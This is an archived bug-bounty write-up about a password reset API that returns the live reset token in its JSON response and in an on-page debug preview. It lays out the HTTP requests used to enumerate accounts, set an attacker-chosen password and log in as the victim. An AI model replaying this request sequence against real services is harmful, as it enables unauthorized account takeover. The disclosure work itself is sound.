# Unauthenticated Account Takeover

- **Source URL:** https://medium.com/@neel.chauhan09/unauthenticated-account-takeover-when-the-password-reset-api-hands-you-the-token-11a62b9d4cf8
- **Fetched from:** https://web.archive.org/web/20261111075319/https://medium.com/@neel.chauhan09/unauthenticated-account-takeover-when-the-password-reset-api-hands-you-the-token-11a62b9d4cf8
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14920 (id 14920)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Unauthenticated Account Takeover: When the Password Reset API Hands You the Token

**CWE-640: Weak Password Recovery Mechanism CWE-200: Exposure of Sensitive Information to an Unauthorized Actor CWE-204: Observable Response Discrepancy CVSS 3.1: 9.1 (Critical)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

## What a forgot-password flow is supposed to guarantee

The entire security model of a password reset feature rests on one assumption: the reset token only ever reaches the account owner, through their verified email inbox. If that assumption breaks anywhere, the whole recovery flow stops being a recovery flow and becomes a bypass for authentication entirely.

I wanted to test that assumption directly, not by trying to guess or brute-force a token, but by checking exactly what data the API returns and where it goes.

## Step one: the enumeration oracle

Before testing token exposure, I checked whether the endpoint behaved differently for an email that has an account versus one that doesn’t. This matters on its own, separate from the bigger finding.

```
POST /api/auth/forgot-password HTTP/2
Content-Type: application/json
```
`{"email":"doesnotexist@example.com"}``HTTP/2 200 OK````
{
  "ok": true,
  "message": "If the email exists, a reset link has been sent."
}
```
Generic, non-committal message. Standard practice, this is exactly what you want a forgot-password endpoint to return regardless of whether the account exists.

Then the same request against a real, existing test account:

```
POST /api/auth/forgot-password HTTP/2
Content-Type: application/json
```
`{"email":"<existing-test-account-email>"}``HTTP/2 200 OK````
{
  "ok": true,
  "message": "If the email exists, a reset link has been sent.",
  "reset_link": "https://<target>/reset-password?token=<TOKEN>"
}
```
The message text is identical in both cases, but the second response includes an entire extra field: `reset_link`, containing a live, working reset URL with the token embedded directly in the query string.

## Get Neel Chauhan’s stories in your inbox

Join Medium for free to get updates from this writer.

That field’s mere presence or absence is already an account enumeration primitive, an attacker can determine whether any given email address has a registered account just by checking whether `reset_link` shows up in the response. But that's the smaller half of this finding.

## Step two: the token itself, right there in the response body

Look again at what that field actually contains. It’s not a placeholder or a redacted preview, it’s the complete, functional reset URL, the exact same thing that would normally only ever be delivered to the account owner’s inbox. I copied the token straight out of the JSON response and used it immediately:

```
POST /api/auth/reset-password HTTP/2
Content-Type: application/json
```
```
{
  "token": "<TOKEN copied directly from the forgot-password response>",
  "password": "NewAttackerControlled_Pass1!"
}
```
`HTTP/2 200 OK````
{
  "ok": true,
  "message": "Password reset successful."
}
```
That’s the entire attack. One request to learn the target’s email has an account, a second request that hands back a working credential, a third request that consumes it. No email inbox access, required at any point. No phishing, no social engineering, no waiting for a victim to click anything.

## Confirming the takeover

To close the loop, I authenticated using the new password against the standard login endpoint:

```
POST /api/auth/login HTTP/2
Content-Type: application/json
```
```
{
  "email": "<existing-test-account-email>",
  "password": "NewAttackerControlled_Pass1!"
}
```
`HTTP/2 200 OK````
{
  "ok": true,
  "user": { "id": "...", "email": "..." }
}
```
Full session established. Complete account takeover, start to finish, using nothing but a target email address, which is very often public information, guessable from a company’s naming convention, or, on this specific platform, obtainable from a separate BOLA finding I documented in another endpoint.

## Why I also checked the frontend, not just the API

A finding like this is worth being thorough about, because sometimes a raw API response like this turns out to be a debug artifact that’s actually stripped before rendering, meaning the real-world attack surface is smaller than it looks from Burp alone. So I loaded the actual forgot-password page in a browser to see what a normal user, or attacker, would visually encounter.

The page rendered a visible **“Debug preview”** element directly on screen, displaying that exact same reset link a second time, in plain view, no dev tools required. Whatever internal reasoning led to that debug element being added, it meant this wasn’t a subtle API-only issue that only a proxy user would ever find, it was directly visible to anyone who loaded the page.

## Why this outranks almost everything else in severity

A privilege escalation bug or an XSS finding usually requires the attacker to already have some foothold, an account, a victim who clicks something, some existing access. This one requires none of that. It reduces the entire authentication model down to a single fact: knowing an email address. That’s the bar for full account takeover here. Combined with a separate finding I documented around reset tokens never being invalidated after use, every token exposed this way also stays valid indefinitely, compounding the exposure window even further.
